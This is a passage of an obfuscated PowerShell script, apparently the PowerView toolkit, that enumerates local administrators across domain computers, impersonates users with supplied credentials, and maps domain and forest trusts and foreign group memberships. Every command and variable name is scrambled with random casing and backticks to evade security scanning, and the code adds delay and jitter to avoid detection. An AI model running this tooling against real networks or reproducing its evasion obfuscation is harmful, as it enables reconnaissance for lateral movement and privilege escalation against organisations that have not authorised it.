    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('DNSHostName')]
        [String[]]
        ${C`o`mpUtErnaMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`mpUt`erD`oMAin},

        [ValidateNotNullOrEmpty()]
        [String]
        ${CoMPu`TE`Rld`APFILTEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`OMp`UtERsEAR`cH`BASE},

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        ${Com`PU`TeROPerATING`SYs`Tem},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        ${ComPU`TeRSeR`Vic`ePAcK},

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        ${Co`MPuTER`s`iT`eNAmE},

        [Parameter(ValueFromPipelineByPropertyName = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${G`R`OU`pNaMe} = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        ${ME`T`hOD} = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${seR`V`eR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sEaRChS`c`o`Pe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${R`eSU`ltpag`esIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERV`ERt`imE`Lim`iT},

        [Switch]
        ${TO`mB`sT`oNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CReDE`N`TIaL} = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        ${d`e`LAY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${ji`Tt`ER} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${th`REads} = 20
    )

    BEGIN {
        ${C`OM`Pu`Te`RSEarCHeRaRgUmENTs} = @{
            'Properties' = 'dnshostname'
        }
        if (${PSb`OUn`dp`Aram`eTeRs}['ComputerDomain']) { ${Co`mPuteRSE`ArCHe`Rarg`U`mE`NTs}['Domain'] = ${com`Put`er`domA`iN} }
        if (${PSBo`Und`par`A`m`ETeRs}['ComputerLDAPFilter']) { ${CoM`pUTeRseA`RChE`RA`RG`U`mENts}['LDAPFilter'] = ${co`M`pu`TE`RldaPFiLt`Er} }
        if (${psb`Ou`NdpaRam`e`TeRs}['ComputerSearchBase']) { ${cOM`p`UtErsEar`cHEra`R`GUMEnTS}['SearchBase'] = ${C`O`mp`UTERSE`ARCHbase} }
        if (${PS`B`ouNDpaRa`me`TErS}['Unconstrained']) { ${c`omPUTE`R`SeAr`che`R`ArgUMenTS}['Unconstrained'] = ${uN`cOns`T`R`AInED} }
        if (${p`SBouN`D`PARA`MEtErs}['ComputerOperatingSystem']) { ${CoM`PuT`ersEa`RcHeRargUM`EnTS}['OperatingSystem'] = ${OPErATinG`sy`ST`EM} }
        if (${Ps`BO`UnD`P`AraMETE`Rs}['ComputerServicePack']) { ${coMpuTErsEA`R`c`heRAR`g`UmE`NtS}['ServicePack'] = ${s`E`RVICePaCk} }
        if (${p`s`BOund`pa`RaMeTe`Rs}['ComputerSiteName']) { ${COmP`U`Te`RSe`ARC`her`Argum`ENts}['SiteName'] = ${Sit`enA`ME} }
        if (${p`sBOUn`dpA`R`AmeteRS}['Server']) { ${C`OMPut`ersE`AR`ChErAR`Gu`mEn`TS}['Server'] = ${seRv`ER} }
        if (${p`SbOUN`DpAR`AmeTe`RS}['SearchScope']) { ${CO`MPu`Te`R`s`eARChEraR`gU`MeNtS}['SearchScope'] = ${S`earc`h`scOpE} }
        if (${ps`BOU`NDPARa`MeTERs}['ResultPageSize']) { ${cOmpU`TeRs`eaRcHErA`RguMEn`TS}['ResultPageSize'] = ${Res`ULTpaGE`SIzE} }
        if (${p`Sb`OuNdPARa`METErs}['ServerTimeLimit']) { ${CoMPU`T`ers`e`ArC`H`eRArGuM`EN`Ts}['ServerTimeLimit'] = ${sE`RV`Er`Ti`MeLiMIt} }
        if (${p`sB`oun`dpaRa`meTE`RS}['Tombstone']) { ${COm`PuteRS`Ea`RChERARg`U`meNts}['Tombstone'] = ${t`oMBs`TonE} }
        if (${p`SbOUnd`pAr`A`MeTErS}['Credential']) { ${COmPUt`eRS`EArc`h`ERarg`Um`EntS}['Credential'] = ${creDe`Nti`AL} }

        if (${p`sBOUN`D`pArA`mEtERs}['ComputerName']) {
            ${T`Ar`G`ETCoMPUte`RS} = ${c`OmpU`T`ErnAme}
        }
        else {
            WrItE-`VEr`BosE '[Find-DomainLocalGroupMember] Querying computers in the domain'
            ${tARg`eT`C`oMPUTe`RS} = gEt`-`DOM`AiNcoMpUTEr @ComputerSearcherArguments | sElE`ct-`Object -ExpandProperty dnS`hoST`NAMe
        }
        Wr`ItE-`VErBOse "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length)"
        if (${TarGET`COMP`UteRs}.Length -eq 0) {
            throw '[Find-DomainLocalGroupMember] No hosts found to enumerate'
        }

        
        ${HOst`e`Nu`Mb`LOck} = {
            Param(${co`MpU`TeR`N`AMe}, ${gRO`UPN`Ame}, ${m`e`THOd}, ${t`oKENH`AN`dLE})

            
            if (${Gr`o`UP`NAMe} -eq "Administrators") {
                ${a`dMINS`ecu`Ri`TyIde`NTifieR} = NeW-O`Bj`eCT SYsTEm.s`e`CuRi`TY`.prIn`c`ipa`l.s`ecu`RITyidENtiF`iEr([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,${N`ULL})
                ${g`RO`UpNAme} = (${adM`inSe`cURItYIdEnt`i`F`iEr}.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }

            if (${to`kEnha`Ndle}) {
                
                ${n`Ull} = inVokE-uSE`Ri`mPEr`So`NA`TIon -TokenHandle ${ToKeNH`And`LE} -Quiet
            }

            ForEach (${TaR`GEtcoM`P`UtER} in ${C`ompU`T`ERNa`me}) {
                ${uP} = tEs`T-CoNNEC`TiOn -Count 1 -Quiet -ComputerName ${taRGETcO`mPu`T`er}
                if (${U`P}) {
                    ${nETlOc`Al`GroUPMeMb`ERa`RGu`Men`Ts} = @{
                        'ComputerName' = ${T`ARgEtC`Om`P`UteR}
                        'Method' = ${m`eThoD}
                        'GroupName' = ${gR`oUpN`AMe}
                    }
                    get-nETl`ocaL`GrOuPM`E`M`BER @NetLocalGroupMemberArguments
                }
            }

            if (${toK`ENHa`N`dLE}) {
                i`NvokE-ReVER`TT`OSE`lf
            }
        }

        ${lOgOn`Tok`En} = ${nU`LL}
        if (${PS`BOu`N`dPaRam`E`TerS}['Credential']) {
            if (${p`S`BOuN`dpa`RamEtERs}['Delay'] -or ${P`S`BoU`NDpArAME`Te`RS}['StopOnSuccess']) {
                ${logoNt`o`keN} = INvOKE-`UseRi`M`PE`RsON`At`ion -Credential ${crEde`NT`I`AL}
            }
            else {
                ${L`oG`O`NTOkEN} = I`NvOkE`-UsERiMpE`R`soNati`oN -Credential ${c`Re`DeNTiaL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${PSbou`NDp`ArAme`TeRs}['Delay'] -or ${pSBo`UnDp`ARAME`TErS}['StopOnSuccess']) {

            WRItE-V`ErB`oSe "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count)"
            wRI`Te`-VErb`oSE "[Find-DomainLocalGroupMember] Delay: $Delay, Jitter: $Jitter"
            ${CO`UN`TER} = 0
            ${R`And`No} = Ne`W-Obj`Ect S`ys`TEm.RAn`DOm

            ForEach (${t`ArgETc`OM`pUTeR} in ${TARgeTCO`mpuTe`RS}) {
                ${COU`NtER} = ${c`OUnT`eR} + 1

                
                sTA`Rt-S`lEEp -Seconds ${rANd`No}.Next((1-${J`ItT`eR})*${D`ELaY}, (1+${Ji`T`TER})*${d`E`lay})

                WRITe-VEr`BO`SE "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Co`Mm`A`Nd -ScriptBlock ${HOSt`enUMBlO`Ck} -ArgumentList ${ta`RG`Et`ComPUteR}, ${Grou`p`NAme}, ${m`etH`Od}, ${lO`Go`Ntok`en}
            }
        }
        else {
            wr`i`TE-vE`R`BOsE "[Find-DomainLocalGroupMember] Using threading with threads: $Threads"

            
            ${Scri`p`Tp`A`RAms} = @{
                'GroupName' = ${GR`o`UPN`AMe}
                'Method' = ${mE`T`hOD}
                'TokenHandle' = ${loGO`NTOK`EN}
            }

            
            NEW-THrEa`DEDfUn`ct`ION -ComputerName ${TaRg`EtCOm`p`UT`ers} -ScriptBlock ${Ho`stEn`Umbl`o`Ck} -ScriptParameters ${scr`IPtpaRA`Ms} -Threads ${TH`Rea`ds}
        }
    }

    END {
        if (${Lo`go`NToKEn}) {
            I`Nvok`e-`RE`VertT`OsElF -TokenHandle ${logoN`Tok`eN}
        }
    }
}








function get-d`OmaI`N`T`RUsT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUE}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oma`IN},

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        ${A`PI},

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        ${N`et},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${ldapF`iL`TEr},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`OpertI`es},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SeA`Rc`hbaSe},

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sEr`V`ER},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${s`eaR`ChscOpe} = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        ${Re`sULT`pAgES`i`ze} = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        ${s`e`RV`ERtiME`LiMIt},

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        ${T`oMBs`TOnE},

        [Alias('ReturnOne')]
        [Switch]
        ${fin`d`oNE},

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RedeNtI`Al} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${S`sL},

        [Switch]
        ${Ob`FuScA`TE}
    )

    BEGIN {
        ${TRusTAtT`R`IBU`TES} = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }

        ${L`d`AP`SeA`RCherARgUmENtS} = @{}
        if (${psB`o`Und`PA`RAmetE`RS}['Domain']) { ${ldA`p`sEaR`Ch`E`R`ARgUMents}['Domain'] = ${do`main} }
        if (${PsBO`UnDP`A`Ra`METErs}['LDAPFilter']) { ${ldapsEA`R`chE`RAR`GUM`EN`TS}['LDAPFilter'] = ${LdaP`FI`L`TEr} }
        if (${ps`BOUND`parAM`ETErS}['Properties']) { ${LDAPsearch`ERAr`GuM`E`NTs}['Properties'] = ${PRo`p`ert`iES} }
        if (${psbO`UN`Dpar`Am`eteRs}['SearchBase']) { ${LD`APSEa`R`CHERARG`Ume`N`TS}['SearchBase'] = ${seaRCH`B`ASe} }
        if (${pSBOundp`A`R`A`Met`ERs}['Server']) { ${LDa`pse`A`RC`herA`Rgu`MeNTs}['Server'] = ${seRv`er} }
        if (${pSb`oun`Dp`ARAMeTers}['SearchScope']) { ${Ld`ApS`Earc`hE`RAR`Gu`mEntS}['SearchScope'] = ${se`Ar`CHsc`Ope} }
        if (${p`sBoU`Ndp`A`Rame`TErs}['ResultPageSize']) { ${LDa`P`SeA`RcH`E`RARg`UMEnTS}['ResultPageSize'] = ${r`eSuL`Tpa`GeSi`zE} }
        if (${PsbOuN`D`PA`Ra`MEt`eRs}['ServerTimeLimit']) { ${lDAps`ea`R`CH`Erarg`UmEn`TS}['ServerTimeLimit'] = ${SeR`V`erTi`MeLImit} }
        if (${pSBO`U`NdPA`RaM`EtE`Rs}['Tombstone']) { ${lD`A`PSea`RCheraRgum`eNts}['Tombstone'] = ${TOM`BST`oNE} }
        if (${psbo`U`NdpAR`A`Me`TERs}['Credential']) { ${LDa`Pse`AR`CHer`A`RGu`MENtS}['Credential'] = ${c`R`edEntI`AL} }
        if (${PSB`ou`ND`ParaMEtERS}['SSL']) { ${L`D`APSEA`RChER`ArGu`meN`TS}['SSL'] = ${s`sL} }
        if (${PSb`ounDPaRA`M`eT`ErS}['Obfuscate']) {${lDaPsEa`R`c`HERAR`gUmEn`Ts}['Obfuscate'] = ${ob`Fu`SCATe} }

        ${NetsE`A`RC`HeRaR`gUMenTs} = @{}
        if (${Psb`OuN`Dp`ARAM`eT`eRS}['Domain']) { ${L`daPSEARChE`R`A`RgumENtS}['Domain'] = ${dO`Ma`IN} }
        if (${psbOu`NDp`ARA`meteRs}['Server']) { ${Ld`AP`s`E`A`RcHERARgumE`NTS}['Server'] = ${seRV`er} }
        if (${Ps`BO`UNdParAM`et`eRS}['SSL']) { ${Net`seA`RcHerA`RguME`NTS}['SSL'] = ${s`SL} }
        if (${pSB`OUndP`ARAm`Et`eRs}['Obfuscate']) {${NETSEAr`c`h`ErARgumE`NtS}['Obfuscate'] = ${Ob`Fus`Ca`Te} }

    }

    PROCESS {
        if (${P`s`CMD`let}.ParameterSetName -ne 'API') {
            if (${do`MA`IN} -and ${d`OMAIN}.Trim() -ne '') {
                ${So`U`RcEDOM`AIn} = ${DO`Ma`in}
            }
            else {
                if (${p`SbO`UNdpAraMET`eRs}['Credential']) {
                    ${SOu`RCedO`ma`iN} = (g`et-d`om`AIN -Credential ${CR`EDEn`TIAL}).Name
                }
                else {
                    ${souR`CEDO`mAiN} = (G`et-dO`MAIn).Name
                }
            }
        }
        elseif (${PSC`MD`LEt}.ParameterSetName -ne 'NET') {
            if (${d`oM`Ain} -and ${DOM`AIN}.Trim() -ne '') {
                ${s`ouR`Ced`Omain} = ${D`oMaIn}
            }
            else {
                ${SOUrC`e`dOMAiN} = ${e`Nv:uSe`R`dnsDoM`AIn}
            }
        }

        if (${PSCmD`lET}.ParameterSetName -eq 'LDAP') {
            
            ${SO`U`RcEsid} = Get`-dOM`AINSid @NetSearcherArguments


            ${reSU`lTS} = inV`OK`e-l`DAPqUErY @LdapSearcherArguments -LDAPFilter "(objectClass=trustedDomain)"
            ${Re`sULTs} | wHeRe`-obJ`ECt {${_}} | fOR`EacH-obje`ct {
                if (g`ET`-MemB`eR -inputobject ${_} -name "Attributes" -Membertype ProP`E`RTIes) {
                    ${p`R`oPS} = @{}
                    foreach (${A} in ${_}.Attributes.Keys | sO`R`T-Obj`EcT) {
                        if ((${A} -eq 'objectsid') -or (${a} -eq 'sidhistory') -or (${A} -eq 'objectguid') -or (${A} -eq 'usercertificate') -or (${A} -eq 'securityidentifier')) {
                            ${PR`Ops}[${a}] = ${_}.Attributes[${a}]
                        }
                        else {
                            ${v`AL`UES} = @()
                            foreach (${v} in ${_}.Attributes[${A}].GetValues([byte[]])) {
                                ${v`A`LUEs} += [System.Text.Encoding]::UTF8.GetString(${V})
                            }
                            ${pr`o`PS}[${a}] = ${VA`LU`eS}
                        }
                    }
                }
                else {
                    ${Pr`opS} = ${_}.Properties
                }

                ${D`OmaiNTR`USt} = Ne`W-`ob`JECT PsOb`je`ct

                ${TRuS`TaT`TR`ib} = @()
                ${tr`UsTAT`TR`IB} += ${T`RUst`A`TTrIbu`TeS}.Keys | Where-OB`j`ECT { ${pr`O`ps}.trustattributes[0] -band ${_} } | fo`ReAc`H-ob`jECt { ${t`Rust`ATtrIB`Ut`ES}[${_}] }

                ${dI`R`eC`TIon} = Switch (${PrO`Ps}.trustdirection) {
                    0 { 'Disabled' }
                    1 { 'Inbound' }
                    2 { 'Outbound' }
                    3 { 'Bidirectional' }
                }

                ${Tr`U`stT`ype} = Switch (${p`R`Ops}.trusttype) {
                    1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                    2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                    3 { 'MIT' }
                }

                ${d`i`StiNGuisHe`DNA`ME} = ${PrO`pS}.distinguishedname[0]
                ${Sou`RCe`NaMeI`NDEX} = ${dIS`TI`N`G`UIsHEDNAmE}.IndexOf('DC=')
                if (${sOuRcENAM`Ei`N`DeX}) {
                    ${soUrCE`DO`m`AIN} = $(${distI`NguIsh`edn`A`mE}.SubString(${S`O`Ur`CE`NAMEIndEX})) -replace 'DC=','' -replace ',','.'
                }
                else {
                    ${SOURc`E`DOm`Ain} = ""
                }

                ${tAr`geTnAM`eInd`EX} = ${DIs`TiNGuiS`heDN`AME}.IndexOf(',CN=System')
                if (${s`oURCen`AmeI`Nd`eX}) {
                    ${TAr`g`Et`dOmain} = ${DIST`i`NguisH`EdnA`ME}.SubString(3, ${tA`R`G`etNamEiN`DEX}-3)
                }
                else {
                    ${T`ARgEtd`oMAiN} = ""
                }

                ${OBJeC`Tg`UID} = nE`w-oBJ`eCT GU`Id @(,${p`RopS}.objectguid[0])
                ${Ta`RgetS`id} = (ne`w`-obJeCT sYsTEM.`SeC`U`RI`TY`.PrInC`IPAL.S`ec`URi`T`Y`id`eNtIf`ieR(${Pr`oPS}.securityidentifier[0],0)).Value

                ${DoMa`i`NTR`Ust} | a`Dd`-M`EMBEr N`OtePR`OPE`RtY 'SourceName' ${soURce`DoM`A`in}
                ${d`o`maiNTruSt} | ADD-`Me`mbEr NOTEP`R`Ope`RtY 'TargetName' ${pR`Ops}.name[0]
                
                ${domA`I`NtRuSt} | add`-m`eMbEr Not`EprOPeR`TY 'TrustType' ${tR`UsTTY`Pe}
                ${DOm`AintR`UsT} | A`dd-M`EMbER not`ep`RopERtY 'TrustAttributes' $(${TrUS`T`A`TtRiB} -join ',')
                ${DO`MAI`NtRU`sT} | AdD-Mem`B`eR N`ot`E`PropeRty 'TrustDirection' "$Direction"
                ${Do`MAINTru`st} | A`dd-`mEm`Ber N`otEPrO`Pe`Rty 'WhenCreated' ${pro`PS}.whencreated[0]
                ${DOMAIn`T`RUst} | Add`-mEmb`Er notEp`RO`P`ErTY 'WhenChanged' ${P`R`oPS}.whenchanged[0]
                ${d`OMaiNT`RusT}.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                ${Do`ma`iNtrUSt}
            }
            if (${R`eSu`LtS}) {
                try { ${R`Esu`Lts}.dispose() }
                catch {
                    writE`-V`Er`BOSE "[Get-DomainTrust] Error disposing of the Results object: $_"
                }
            }
        }
        elseif (${PS`c`Mdlet}.ParameterSetName -eq 'API') {
            
            if (${PSboUND`PAra`mEt`ErS}['Server']) {
                ${Ta`Rg`eTdC} = ${sE`RvER}
            }
            elseif (${DO`MA`IN} -and ${Dom`AIN}.Trim() -ne '') {
                ${tARG`ET`dC} = ${D`oMa`in}
            }
            else {
                
                ${t`ARG`ETdC} = ${Nu`Ll}
            }

            
            ${P`T`RinfO} = [IntPtr]::Zero

            
            ${FL`AGS} = 63
            ${dom`AI`N`cOUnt} = 0

            
            ${Re`suLt} = ${NetA`P`I32}::DsEnumerateDomainTrusts(${TaRG`e`TDc}, ${fl`A`GS}, [ref]${PTR`i`Nfo}, [ref]${DOMAINcO`U`NT})

            
            ${oFf`SET} = ${pTri`N`Fo}.ToInt64()

            
            if ((${r`ESu`LT} -eq 0) -and (${oFf`seT} -gt 0)) {

                
                ${i`NCReME`NT} = ${D`S_doMAin`_t`RUstS}::GetSize()

                
                for (${I} = 0; (${I} -lt ${d`OM`AInC`ouNT}); ${I}++) {
                    
                    ${NEw`I`Ntp`TR} = n`eW-`oBJECt s`ySTem.I`NTp`TR -ArgumentList ${o`F`FSET}
                    ${I`NfO} = ${newiN`T`PTr} -as ${ds`_dOmaIN_TR`U`STS}

                    ${Of`F`set} = ${neW`in`TPtR}.ToInt64()
                    ${o`FFs`et} += ${I`NCr`EmenT}

                    ${siD`STr`ing} = ''
                    ${Res`ULt} = ${aDVa`Pi32}::ConvertSidToStringSid(${IN`Fo}.DomainSid, [ref]${siDst`R`iNg});${LAST`Err`Or} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (${r`e`SulT} -eq 0) {
                        writ`e`-verB`ose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                    }
                    else {
                        ${D`OM`AInTrU`sT} = n`e`w-ObjEct pSob`J`Ect
                        ${dOmA`Intr`U`st} | a`dd-M`E`MbeR N`oT`ePROpEr`TY 'SourceName' ${so`Urc`E`DOmaIn}
                        ${domaIn`Tr`UST} | ADd-`M`EmBEr N`otE`P`RoPerTy 'TargetName' ${IN`FO}.DnsDomainName
                        ${dom`AI`NtrUSt} | aDd-`Mem`B`eR noTeP`ROP`e`RTY 'TargetNetbiosName' ${IN`FO}.NetbiosDomainName
                        ${DOMAINT`Ru`st} | A`DD-`MemB`eR NOT`E`PROPE`RtY 'Flags' ${I`NfO}.Flags
                        ${Do`mAI`NtrusT} | a`D`d-MEmb`er nO`T`EpROPERtY 'ParentIndex' ${I`NFO}.ParentIndex
                        ${DO`Mai`N`TrUst} | A`dD-`meM`Ber NOtepr`o`PE`RtY 'TrustType' ${I`Nfo}.TrustType
                        ${dOma`InTR`U`st} | aDd`-`me`mbER nO`TePRo`Per`Ty 'TrustAttributes' ${IN`FO}.TrustAttributes
                        ${dom`Aint`R`USt} | aDD-m`eMb`Er no`TEprOPEr`Ty 'TargetSid' ${SI`DSTRI`Ng}
                        ${d`O`MA`iNTrUsT} | adD-M`E`M`BEr n`O`TePRopERTY 'TargetGuid' ${i`NFO}.DomainGuid
                        ${DOMA`InTr`USt}.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        ${doM`AInTRU`st}
                    }
                }
                
                ${N`ULL} = ${N`eT`API32}::NetApiBufferFree(${P`TrI`NfO})
            }
            else {
                w`Ri`T`E-Ver`BOse "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
        else {
            
            ${F`Ou`NDdOMa`IN} = Ge`T-dO`mAiN @NetSearcherArguments
            if (${fO`UnDdoMA`in}) {
                ${fO`UNd`D`oMAiN}.GetAllTrustRelationships() | ForEa`c`h-OBJE`ct {
                    ${_}.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    ${_}
                }
            }
        }
    }
}


function G`eT-f`oRE`S`TtRusT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RuE}, ValueFromPipelineByPropertyName = ${tR`UE})]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Fo`R`EST},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`dENti`Al} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ${n`eTFORe`s`TaR`Gu`MeNtS} = @{}
        if (${pS`BouN`dpaRam`eTeRS}['Forest']) { ${n`ET`FOrE`StarG`UMEnTS}['Forest'] = ${fo`RE`sT} }
        if (${PsbOuN`D`Para`MEtERs}['Credential']) { ${Ne`TFoRe`s`TA`RGumenTS}['Credential'] = ${CRedeN`TI`AL} }

        ${f`oUnd`For`ESt} = get`-FO`Rest @NetForestArguments

        if (${foUndfo`R`est}) {
            ${f`Ou`NDfo`REST}.GetAllTrustRelationships() | f`O`Re`AC`h-obJeCT {
                ${_}.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                ${_}
            }
        }
    }
}


function g`ET`-domaInFo`R`eI`gNU`SeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`Rue}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`MaiN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${l`daPFI`ltER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`RO`Perti`ES},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${se`ARc`Hbase},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SeR`VEr},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SEaR`cHs`C`Ope} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${reS`U`ltPAGE`sIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`R`V`eRTIm`ElIMiT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${SEC`U`RiT`yMA`SkS},

        [Switch]
        ${TOm`B`sT`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEdENT`I`AL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${searc`hE`RaR`GUmenTS} = @{}
        ${s`EaR`CheRA`RgumE`NtS}['LDAPFilter'] = '(memberof=*)'
        if (${ps`Bo`Undp`ARam`E`TErs}['Domain']) { ${S`eaRchErarG`U`mEN`TS}['Domain'] = ${D`o`maIN} }
        if (${psb`oUNDPARaM`E`T`erS}['Properties']) { ${se`ARcher`ARg`U`ME`Nts}['Properties'] = ${pROPE`R`T`IeS} }
        if (${pSboUNdP`AR`AmE`TE`Rs}['SearchBase']) { ${sE`AR`CH`eR`A`RgUmeNts}['SearchBase'] = ${sEaR`cHb`A`sE} }
        if (${p`s`Bo`U`NDPAr`AMetERs}['Server']) { ${seA`RCheRa`RgU`mENTs}['Server'] = ${s`e`RvER} }
        if (${PsB`ouND`p`ArAME`TERs}['SearchScope']) { ${seAR`cheRA`RGu`mE`Nts}['SearchScope'] = ${seAR`ch`S`CoPe} }
        if (${p`sBOu`NDPA`R`Am`eters}['ResultPageSize']) { ${Se`ARcHe`Rar`Gum`EntS}['ResultPageSize'] = ${Re`Sul`Tp`AgeSize} }
        if (${P`SB`oUND`PARaMEteRS}['ServerTimeLimit']) { ${S`eAR`c`hErA`R`gumEnTS}['ServerTimeLimit'] = ${sErve`Rt`imELIm`iT} }
        if (${psBOUn`dpaR`A`M`e`Ters}['SecurityMasks']) { ${SE`A`Rch`erArgUm`ENTs}['SecurityMasks'] = ${secuRi`T`Y`Mas`ks} }
        if (${Ps`Bo`Und`PArAMetERs}['Tombstone']) { ${sE`ARchEra`Rgum`E`NTs}['Tombstone'] = ${TO`M`BStOnE} }
        if (${P`Sb`oU`ND`Par`AmetERs}['Credential']) { ${Se`ArchEraR`gUmE`Nts}['Credential'] = ${cReD`E`NTiaL} }
        if (${ps`Bou`NDpaRameT`erS}['Raw']) { ${S`ea`RCH`era`RG`UmeNtS}['Raw'] = ${R`AW} }
    }

    PROCESS {
        GEt`-d`o`Mai`NUsEr @SearcherArguments  | f`orEA`c`h-ObjECT {
            ForEach (${ME`M`BerShIp} in ${_}.memberof) {
                ${i`N`DEx} = ${M`eMBER`sHiP}.IndexOf('DC=')
                if (${i`Ndex}) {

                    ${gR`OupDo`mA`In} = $(${M`eMBe`RSh`ip}.SubString(${in`Dex})) -replace 'DC=','' -replace ',','.'
                    ${u`s`erDI`StiNGuIsH`e`d`Name} = ${_}.distinguishedname
                    ${UsE`RI`NDex} = ${US`e`RDIsT`Ingu`iSHEdnaME}.IndexOf('DC=')
                    ${uS`e`RdO`MaIn} = $(${_}.distinguishedname.SubString(${u`Seri`NDeX})) -replace 'DC=','' -replace ',','.'

                    if (${Gr`oUpDom`AiN} -ne ${USERd`OMa`iN}) {
                        
                        ${gr`OuPnA`me} = ${M`EMber`SHiP}.Split(',')[0].split('=')[1]
                        ${forEIGn`U`Ser} = N`Ew`-OBject PS`ObjecT
                        ${foR`e`IGn`UsEr} | aDd`-MEm`BeR No`TEPRopeR`TY 'UserDomain' ${USe`R`d`oMAin}
